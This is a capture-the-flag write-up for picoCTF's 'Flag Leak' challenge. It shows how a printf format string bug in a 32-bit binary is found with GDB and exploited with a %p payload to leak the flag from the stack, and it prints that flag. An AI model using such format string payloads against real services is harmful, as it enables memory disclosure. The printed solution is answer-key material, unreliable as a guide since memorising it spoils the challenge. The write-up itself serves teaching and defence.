# PicoCTF: Flag Leak Writeup

**Challenge**: Flag Leak  
**Category**: Binary Exploitation  
**Difficulty**: Medium   

## Challenge Description

We are given a 32-bit ELF binary that takes user input and displays it back. The goal is to exploit a vulnerability to leak the flag from memory.

**Given files**: `vuln` (ELF 32-bit executable)  
**Remote target**: `nc saturn.picoctf.net [port]`

## Initial Analysis

### Binary Protection Analysis

```bash
$ checksec --file=vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   78 Symbols	  No
```

**Protection Summary**:
- **Partial RELRO**: GOT can still be partially overwritten
- **No Stack Canary**: Direct buffer overflow exploitation possible
- **NX Enabled**: Stack/heap are non-executable (shellcode injection blocked)
- **No PIE**: Fixed memory addresses (predictable layout)
- **Symbols Present**: Easier reverse engineering

### Binary Execution Test

```bash
$ ./vuln
Please create 'flag.txt' in this directory with your own debugging flag.

$ echo "test_flag" > flag.txt
$ ./vuln
Tell me a story and then I'll tell you one >> Hello
Here's a story - 
Hello
```

The binary reads user input and echoes it back, suggesting a potential format string vulnerability.

### Source Code Analysis

```bash
$ objdump -d vuln
```

Key functions identified:
- `main()` at `0x80493bf`
- `vuln()` at `0x8049333` 
- `readflag()` at `0x80492b6`

Source code reconstruction:
```c
void readflag(char* buf, size_t len) {
    FILE *f = fopen("flag.txt","r");
    if (f == NULL) {
        printf("Please create 'flag.txt' in this directory with your own debugging flag.\n");
        exit(0);
    }
    fgets(buf, len, f);
}

void vuln(){
    char flag[BUFSIZE];      // Local buffer for flag
    char story[128];         // User input buffer
    
    readflag(flag, FLAGSIZE);
    printf("Tell me a story and then I'll tell you one >> ");
    scanf("%127s", story);
    printf("Here's a story - \n");
    printf(story);           // VULNERABLE: Format string bug
    printf("\n");
}
```

## Vulnerability Identification

The critical vulnerability is in the `vuln()` function:

```c
printf(story);  // Should be: printf("%s", story);
```

This **format string vulnerability** allows us to:
1. Read arbitrary memory locations using format specifiers like `%p`, `%x`
2. Write to arbitrary memory locations using `%n`
3. Control the format string content entirely

Since the flag is stored in a local buffer in the `vuln()` function's stack frame, we can potentially read it using format string specifiers.

## Stack Analysis with GDB

### Finding Reference Addresses

First, we need to identify key addresses from the disassembly:

```bash
$ objdump -d vuln 
```

**Key addresses identified**:
- **Return address**: `0x8049418` (where execution returns after `vuln()` completes)
- **Breakpoint address**: `0x80493a3` (right before the vulnerable `printf()` call)

### Stack Layout Investigation

```bash
$ echo "picoCTF{test_flag_for_debugging}" > flag.txt
$ gdb ./vuln
(gdb) break *0x80493a3
(gdb) run
# Input: test
(gdb) x/70x $esp
```

**Stack dump output**:
<img width="808" height="443" alt="image" src="https://github.com/user-attachments/assets/98e54e4e-a15f-48fe-b36b-fd804459f23f" />

**Analysis**:
1. **Return address** `0x08049418` found at position 55 (counting from stack top)
2. **Flag data** found at positions 37-44:
   - `0x6f636970` → "pico"
   - `0x7b465443` → "CTF{"
   - `0x74736574` → "test"
   - `0x616c665f` → "_fla"
   - etc.

### Understanding Stack Positions

The stack grows downward in memory. When `printf()` processes format specifiers, it reads arguments from specific stack positions:

- `%1$p` reads position 1 (near current stack pointer)
- `%37$p` reads position 37 (where our flag starts)
- `%55$p` reads position 55 (the return address)

## Exploitation

### Step 1: Verify Format String Vulnerability

```bash
$ nc saturn.picoctf.net [port]
Tell me a story and then I'll tell you one >> %p.%p.%p
Here's a story - 
0x8048338.0xf7fc3dc0.0xf7fc0ac0
```

The format string vulnerability is confirmed - we can read stack memory.

### Step 2: Locate the Flag

Based on our GDB analysis, the flag should be around positions 36-44. Testing with the remote server:

<img width="1351" height="136" alt="image" src="https://github.com/user-attachments/assets/706e1623-a8cd-4576-b214-c1d3eaa89814" />

### Step 3: Convert Hex to ASCII

The flag data is in positions 36-45. Converting each hex value (accounting for little-endian byte order):

```python
hex_values = [
    '0x6f636970',  # Position 36
    '0x7b465443',  # Position 37  
    '0x6b34334c',  # Position 38
    '0x5f676e31',  # Position 39
    '0x67346c46',  # Position 40
    '0x6666305f',  # Position 41
    '0x3474535f',  # Position 42
    '0x395f6b63',  # Position 43
    '0x32653939',  # Position 44
    '0x7d343238'   # Position 45
]

def hex_to_ascii(hex_val):
    # Remove 0x prefix and convert to bytes (little-endian)
    hex_clean = hex_val[2:]
    # Reverse byte order for little-endian
    bytes_reversed = ''.join(reversed([hex_clean[i:i+2] for i in range(0, len(hex_clean), 2)]))
    return bytes.fromhex(bytes_reversed).decode('ascii')

flag = ''.join([hex_to_ascii(h) for h in hex_values])
print(flag)  # picoCTF{L34k1ng_Fl4g_0ff_St4ck_99e2824}
```

**Manual conversion**:
- `0x6f636970` → bytes: `70 69 63 6f` → "pico"
- `0x7b465443` → bytes: `43 54 46 7b` → "CTF{"
- `0x6b34334c` → bytes: `4c 33 34 6b` → "L34k"
- `0x5f676e31` → bytes: `31 6e 67 5f` → "1ng_"
- `0x67346c46` → bytes: `46 6c 34 67` → "Fl4g"
- `0x6666305f` → bytes: `5f 30 66 66` → "_0ff"
- `0x3474535f` → bytes: `5f 53 74 34` → "_St4"
- `0x395f6b63` → bytes: `63 6b 5f 39` → "ck_9"
- `0x32653939` → bytes: `39 39 65 32` → "99e2"
- `0x7d343238` → bytes: `38 32 34 7d` → "824}"

## Solution

**Flag**: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_99e2824}`

**Final payload**: `%36$p%37$p%38$p%39$p%40$p%41$p%42$p%43$p%44$p%45$p`

## Technical Details

### Why This Attack Works

1. **Format String Vulnerability**: `printf(user_input)` treats user input as format string
2. **Stack-based Flag Storage**: Flag is stored in local buffer on the stack
3. **Predictable Memory Layout**: No PIE means consistent stack positions
4. **No Stack Canary**: No protection against stack memory reads

### Key Concepts

**Little-Endian Byte Order**: x86 architecture stores multi-byte values with least significant byte first:
- Memory: `70 69 63 6f` 
- Displayed as: `0x6f636970`
- ASCII interpretation: reverse bytes → `70 69 63 6f` → "pico"

**Stack Frame Layout**:
```
Higher Addresses
├── main() return address
├── main() local variables  
├── vuln() return address    ← Position ~55
├── vuln() local variables
├── flag[64] buffer          ← Positions 36-45
├── story[128] buffer
├── function parameters
ESP (Stack Pointer)          ← Position 1
Lower Addresses
```

**Format String Position Calculation**: 
- `%n$p` reads the nth 4-byte value from the stack relative to where printf expects arguments
- Position numbers correspond to 32-bit (4-byte) stack slots
- Stack grows downward, but position numbers increase upward

### Alternative Approaches

This challenge could also be solved using:
1. **Buffer overflow** (if canaries were disabled and we needed code execution)
2. **GOT overwrite** via format string writes (using `%n`)
3. **Direct memory dump** with many `%p` specifiers

However, the format string read approach is the most direct since we only need to extract the flag data, not achieve code execution.

## Lessons Learned

1. **Always validate format strings** - use `printf("%s", user_input)` instead of `printf(user_input)`
2. **Stack data is accessible** - local variables can be leaked via format string bugs
3. **GDB is essential** - understanding memory layout is crucial for exploitation
4. **Endianness matters** - x86 little-endian byte order affects data interpretation
5. **Position counting** - systematic approach to finding the right stack offsets

This challenge demonstrates how a simple format string vulnerability can lead to complete information disclosure when sensitive data is stored on the stack.
